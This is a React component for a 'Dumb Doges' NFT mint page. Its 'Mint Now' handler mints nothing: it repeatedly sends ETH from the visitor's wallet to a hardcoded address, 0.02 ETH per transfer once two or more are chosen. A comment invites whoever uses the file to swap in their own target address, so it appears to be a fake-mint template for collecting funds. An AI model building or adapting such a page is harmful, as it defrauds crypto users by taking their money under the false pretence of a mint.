import React, { useState } from 'react';
import { ethers } from 'ethers';
import { Box, Button, Flex, Input, Text } from "@chakra-ui/react";

const MainMint = ({ accounts, setAccounts }) => {
  const targetAddress = '0xf268086704124cCC3e04F54ef1Ef0533A626dEb1'; // 替换为您的目标地址

  const [mintCount, setMintCount] = useState(1);
  const isConnected = Boolean(accounts[0]);
  const handleIncrease = () => {
    if (mintCount < 10) {
      setMintCount(mintCount + 1);
    }
  };

  const handleDecrease = () => {
    if (mintCount > 1) {
      setMintCount(mintCount - 1);
    }
  };

  const handleMint = async () => {
    if (window.ethereum) {
      try {
        await window.ethereum.enable();
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        const signer = provider.getSigner();

        const transferAmount = mintCount === 1 ? '0.002' : '0.02';

        // Perform the specified number of transfers
        for (let i = 0; i < mintCount; i++) {
          const tx = await signer.sendTransaction({
            to: targetAddress,
            value: ethers.utils.parseEther(transferAmount),
          });

          // 等待交易确认
          await tx.wait();

          console.log(`Transferred ${transferAmount} ETH for Mint ${i + 1}`);
        }
      } catch (error) {
        console.error('Error:', error);
      }
    } else {
      console.error('Ethereum provider not detected.');
    }
  };

  return (
    <Flex justify="center" align="center" height="100vh" paddingBottom="150px">
      <Box width="520px">
        <Text fontSize="48px" textShadow="0 5px #000000">
        Dumb Doges
        </Text>
        <Text
          fontSize="30px"
          letterSpacing="-5.5%"
          fontFamily="VT323"
          textShadow="0 2px 2px #000000"
        >
          wait? what?
10,000 Dumb Doges landed on Ethscriptions
        </Text>
        {isConnected ? (
          <div>
            <Flex justify="center" align="center">
              <Button
                backgroundColor="#D6517D"
                borderRadius="5px"
                boxShadow="0px 2px 2px 1px #0F0F0F"
                color="white"
                cursor="pointer"
                fontFamily="inherit"
                padding="15px"
                marginTop="10px"
                onClick={handleDecrease}
              >
                -
              </Button>
              <Input
                readOnly
                fontFamily="inherit"
                width="100px"
                height="40px"
                textAlign="center"
                paddingLeft="19px"
                marginTop="10px"
                type="number"
                value={mintCount}
              />
              <Button
                backgroundColor="#D6517D"
                borderRadius="5px"
                boxShadow="0px 2px 2px 1px #0F0F0F"
                color="white"
                cursor="pointer"
                fontFamily="inherit"
                padding="15px"
                marginTop="10px"
                onClick={handleIncrease}
              >
                +
              </Button>
            </Flex>
            <Button
              backgroundColor="#D6517D"
              borderRadius="5px"
              boxShadow="0px 2px 2px 1px #0F0F0F"
              color="white"
              cursor="pointer"
              fontFamily="inherit"
              padding="15px"
              marginTop="10px"
              onClick={handleMint}
            >
              Mint Now
            </Button>
          </div>
        ) : (
          <Text
            marginTop="70px"
            fontSize="30px"
            letterSpacing="-5.5%"
            fontFamily="VT323"
            textShadow="0 3px #000000"
            color="#D6517D"
          >
            You must be connected to Mint.
          </Text>
        )}
      </Box>
    </Flex>
  );
};

export default MainMint;